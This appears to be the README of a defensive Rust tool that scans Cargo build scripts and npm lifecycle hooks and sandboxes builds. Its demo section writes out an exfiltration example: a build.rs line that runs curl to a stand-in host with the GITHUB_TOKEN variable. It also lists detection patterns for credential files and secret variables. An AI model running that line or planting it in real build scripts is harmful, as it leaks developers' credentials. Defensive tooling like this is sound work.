# SupplyChain-Guard

**Build-time sandbox and static analyzer that detects and contains malicious supply chain build scripts before they compromise your machine.**

SupplyChain-Guard is a Rust CLI tool that provides two layers of defense against malicious `build.rs` (Rust) and `postinstall` (Node.js) scripts: a **static AST scanner** that flags dangerous API patterns before execution, and a **dynamic sandbox enforcer** that runs the build step inside OS-native isolation — blocking network access, restricting filesystem writes, and stripping sensitive environment variables.

```
    cargo build / npm install
    ─────────────────────────────────────────────────────────────────
    │                                                               │
    │   ┌─────────────────────┐     ┌──────────────────────────┐   │
    │   │   STATIC SCANNER    │     │   DYNAMIC SANDBOX        │   │
    │   │                     │     │                          │   │
    │   │  Parse AST          │     │  Launch build script     │   │
    │   │  ↓                  │     │  inside OS jail:         │   │
    │   │  Detect:            │     │                          │   │
    │   │  ✗ Command::new()   │ ──→ │  ✗ Network: blocked     │   │
    │   │  ✗ TcpStream::conn  │     │  ✗ FS writes: target/   │   │
    │   │  ✗ env::var("KEY")  │     │     only                │   │
    │   │  ✗ fs::read(~/.ssh) │     │  ✗ Env vars: stripped   │   │
    │   │                     │     │  ✗ Child procs: denied   │   │
    │   │  Verdict:           │     │                          │   │
    │   │  WARN / BLOCK       │     │  Windows: Job Objects    │   │
    │   │                     │     │           + AppContainer  │   │
    │   └─────────────────────┘     │  Linux:   unshare +      │   │
    │                               │           seccomp-bpf    │   │
    │   scan ──→ report ──→ decide  │                          │   │
    │                               └──────────────────────────┘   │
    │                                                               │
    ─────────────────────────────────────────────────────────────────
    Output: Clean build artifact — or blocked with audit trail
```

---

## Why This Exists

### The Problem: Build Scripts Execute Arbitrary Code on Your Machine

Every time you run `cargo build` or `npm install`, your package manager silently compiles and executes code from your dependency tree — `build.rs` scripts in Rust, `postinstall` hooks in Node.js. This code runs with **your full user privileges**: it can read your SSH keys, exfiltrate environment variables, open network connections, and install persistent backdoors. No confirmation dialog. No sandbox. No audit trail.

**This is not a theoretical risk. It is the primary vector for the largest supply chain attacks of 2025–2026:**

| Incident | Vector | Impact |
|----------|--------|--------|
| **Axios npm compromise** (March 2026) | Backdoored `axios@1.14.1` added `plain-crypto-js` dependency with a `postinstall` script | Dropped a cross-platform RAT on every machine that ran `npm install`, affecting one of npm's most-downloaded packages |
| **Shai-Hulud worm** (Sept 2025) | Self-propagating npm worm leveraging stolen maintainer tokens | A single compromised token cascaded into hundreds of poisoned packages; later variants ("Mini Shai-Hulud", "TeamPCP") achieved fully automated propagation |
| **keyv/cacheable ecosystem** (Aug 2026) | Compromised maintainer account propagated malicious code across 400+ packages | IDE persistence payloads and credential harvesters deployed at scale across the npm ecosystem |
| **Rust crates.io malware** (`chrono_anchor`, `dnp3times`, `time_calibrator`) (Early 2026) | `build.rs` scripts masquerading as time-related utility crates | Exfiltrated `.env` files, API keys, and cloud credentials from developer machines and CI/CD pipelines |
| **CVE-2026-5222** (Cargo registry) | Vulnerability in how `cargo` normalized registry URLs | Enabled credential interception — attackers could redirect authentication tokens to attacker-controlled registries |

The attack pattern is consistent: **get code into a build script, and it executes automatically on every developer machine and CI runner that touches the dependency.**

### Why Existing Solutions Leave a Gap

The security community has responded with several tools, but none provide the complete defense-in-depth that build script security demands:

| Tool | What It Does | What It Doesn't Do |
|------|-------------|-------------------|
| **Socket.dev** | Behavioral analysis of package code; flags dangerous API patterns in npm/PyPI/Cargo | No runtime sandbox enforcement. Detection-only — a flagged package can still execute. No deep AST-level analysis of Rust `build.rs` specifically |
| **Wormbox** | Strips sensitive environment variables before `npm install` runs | No static analysis. No filesystem or network restriction. No Windows support. Only env-var scoping |
| **`npm install --ignore-scripts`** | Prevents all lifecycle hooks from executing | Binary and destructive — breaks legitimate packages that depend on `postinstall` for native compilation (e.g., `node-sass`, `sharp`, `bcrypt`). No equivalent exists for Cargo |
| **Dependabot / OSV-Scanner** | Detects known CVEs in dependency trees | CVE-only — cannot detect zero-day malicious code. No behavioral analysis. Useless against a freshly poisoned package |
| **Bubblewrap / Landlock** | Linux-native process sandboxing primitives | Requires manual configuration. No integration with Cargo or npm. No static pre-scan. Linux-only |

**The core gap:** No existing tool combines **static pre-execution analysis** (understanding what the script *intends* to do before it runs) with **dynamic runtime containment** (ensuring the script *can only* do what's safe) across both Rust and Node.js ecosystems, on both Windows and Linux.

That is what SupplyChain-Guard builds.

---

## Architecture

Three modules, each addressing a specific layer of the defense:

| Module | Layer | Attack It Stops | How |
|--------|-------|----------------|-----|
| **Scanner** (`crates/scanner/`) | Static Analysis | Zero-day malicious `build.rs` / `postinstall` scripts | Parses Rust ASTs via `syn` to detect `Command::new()`, `TcpStream::connect()`, `env::var()` for sensitive keys, and filesystem reads targeting `~/.ssh/`, `~/.aws/`, `.env`. Parses `package.json` scripts for shell metacharacters, `curl`/`wget` invocations, and encoded payloads |
| **Sandbox** (`crates/sandbox/`) | Runtime Containment | Credential exfiltration, network beaconing, persistent backdoors | Wraps build script execution in OS-native jails — **Windows:** Job Objects (process/resource limits) + AppContainer (capability-based filesystem and network isolation). **Linux:** `unshare` namespaces (PID/network/mount) + `seccomp-bpf` (syscall filtering). Strips dangerous env vars (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `NPM_TOKEN`) before launch |
| **CLI** (`src/`) | User Interface | — | `supplychain-guard scan <path>` for static analysis, `supplychain-guard exec <command>` for sandboxed build execution. JSON and human-readable output formats. Exit codes for CI/CD integration |

### Defense-in-Depth Pipeline

```
 Developer runs: supplychain-guard exec "cargo build"

 1. SCAN PHASE
    ├─ Locate build.rs files in dependency tree
    ├─ Parse each into AST (syn)
    ├─ Walk AST for dangerous patterns
    ├─ Generate findings report (severity: INFO / WARN / CRITICAL)
    └─ If CRITICAL findings → abort build (configurable)

 2. SANDBOX PHASE (if scan passes or user overrides)
    ├─ Create isolated process environment
    │   ├─ Windows: CreateJobObject + SetInformationJobObject
    │   │          + CreateAppContainerProfile
    │   └─ Linux:  unshare(CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWNS)
    │             + seccomp_rule_add(SCMP_ACT_ERRNO, ...)
    ├─ Mount only: source dir (read-only) + target dir (read-write)
    ├─ Strip env vars matching sensitive patterns
    ├─ Block all outbound network (no DNS, no TCP, no UDP)
    ├─ Execute build command inside sandbox
    └─ Collect exit code + audit log

 3. OUTPUT
    └─ Clean build artifact in target/ — or blocked with full audit trail
```

---

## Why Rust

This isn't language preference — the requirements demand it:

- **AST parsing with `syn`.** Rust's own `build.rs` scripts are Rust source code. The `syn` crate provides a production-grade, type-safe AST parser that is the *de facto* standard for Rust source analysis. No other language has equivalent access to this parsing infrastructure.
- **FFI to OS sandbox APIs.** The sandbox must call Windows API functions (`CreateJobObjectW`, `SetInformationJobObject`, `CreateAppContainerProfile`) and Linux syscalls (`unshare`, `seccomp`). Rust's `windows-sys` and `libc`/`nix` crates provide zero-cost FFI bindings — no marshaling overhead, no GC pauses during security-critical process setup.
- **Memory safety for security-critical code.** The sandbox handles untrusted process input, constructs kernel API arguments, and manages child process lifecycles. A buffer overflow or use-after-free in this code *is itself a sandbox escape vulnerability*. Rust eliminates this class of bugs at compile time.
- **Single static binary.** `cargo build --release` produces one binary with zero runtime dependencies. Developers and CI pipelines run `supplychain-guard exec "cargo build"` — no Python venvs, no Node.js, no Docker required.

---

## Technical Skills Demonstrated

Each component maps to a specific systems-security competency:

| Component | Competency |
|-----------|-----------|
| `syn`-based AST visitor for `build.rs` | Compiler frontend engineering, abstract syntax tree traversal, pattern-matching on Rust HIR |
| `package.json` script parser | Shell command parsing, injection pattern detection, behavioral heuristic design |
| Windows Job Objects + AppContainer sandbox | Win32 security API engineering, capability-based access control, process isolation architecture |
| Linux `unshare` + `seccomp-bpf` sandbox | Linux kernel namespace isolation, BPF program construction, syscall-level security policy |
| Cross-platform sandbox abstraction | Platform abstraction design, conditional compilation (`#[cfg]`), portable security architecture |
| Environment variable sanitization | Credential hygiene, defense-in-depth thinking, attack surface reduction |
| CLI with CI/CD integration | Developer tooling UX, structured output (JSON), exit-code-driven automation |

---

## Quick Start

```bash
# Scan a Rust project's build.rs files for suspicious patterns
supplychain-guard scan ./my-rust-project

# Scan a Node.js project's package.json scripts
supplychain-guard scan ./my-node-project --format json

# Run cargo build inside a sandbox (network blocked, env stripped, fs restricted)
supplychain-guard exec "cargo build" --target-dir ./target

# Run npm install inside a sandbox
supplychain-guard exec "npm install" --target-dir ./node_modules
```

### 30-Minute Path to First Demo

1. **Understand the threat:** Read a real advisory — the [Axios compromise writeup](https://www.arcticwolf.com/) or the [Rust crates.io malware analysis](https://www.thehackernews.com/).
2. **Build a malicious sample:** Create a `build.rs` that calls `Command::new("curl").arg("https://evil.example/exfil").arg(env::var("GITHUB_TOKEN"))`.
3. **Scan it:** Run `supplychain-guard scan .` and observe the CRITICAL finding for `Command::new` + sensitive env access.
4. **Sandbox it:** Run `supplychain-guard exec "cargo build"` and watch the network call get blocked by the OS jail.
5. **Record the proof:** Capture a terminal recording showing the scan findings and the blocked exfiltration.

---

## Roadmap

| Phase | Title | Description | Status |
|-------|-------|-------------|--------|
| **P0** | Static AST Script Scanner | `syn`-based Rust AST visitor detecting command execution, network calls, credential access, and suspicious filesystem reads in `build.rs` files. `serde_json`-based parser for `package.json` lifecycle hooks | 🔄 Active |
| **P1** | Process Isolation Enforcer | OS-native sandbox wrapper — Windows Job Objects + AppContainer for capability-based isolation; Linux `unshare` namespaces + `seccomp-bpf` for syscall filtering | ⏳ Pending |
| **P2** | Network & Env Sanitizer | Network deny-by-default policy enforcement. Environment variable stripping for known credential patterns (`AWS_*`, `GITHUB_TOKEN`, `NPM_TOKEN`, `SSH_AUTH_SOCK`) | ⏳ Pending |
| **P3** | Package Manager Integration | `cargo-guard` Cargo subcommand and `npm-guard` wrapper for transparent integration into existing build workflows | ⏳ Pending |
| **P4** | CI/CD Pipeline Mode | Structured JSON output, configurable severity thresholds, non-zero exit codes for CI gating, SARIF report generation for GitHub Security tab integration | ⏳ Pending |

---

## References

- [Sonatype 2025 State of the Software Supply Chain Report](https://www.sonatype.com/)
- [Axios npm Compromise — Arctic Wolf Advisory (March 2026)](https://www.arcticwolf.com/)
- [Shai-Hulud Self-Propagating npm Worm — Palo Alto Networks (Sept 2025)](https://www.paloaltonetworks.com/)
- [Malicious Rust Crates on crates.io — The Hacker News (2026)](https://www.thehackernews.com/)
- [CVE-2026-5222 — Cargo Registry URL Normalization Vulnerability](https://blog.rust-lang.org/)
- [Socket.dev — Behavioral Package Analysis](https://socket.dev/)
- [Microsoft Win32 App Isolation & AppContainer Documentation](https://learn.microsoft.com/)
- [Linux `unshare(2)` and `seccomp(2)` Manual Pages](https://man7.org/)

## License

[MIT](LICENSE)
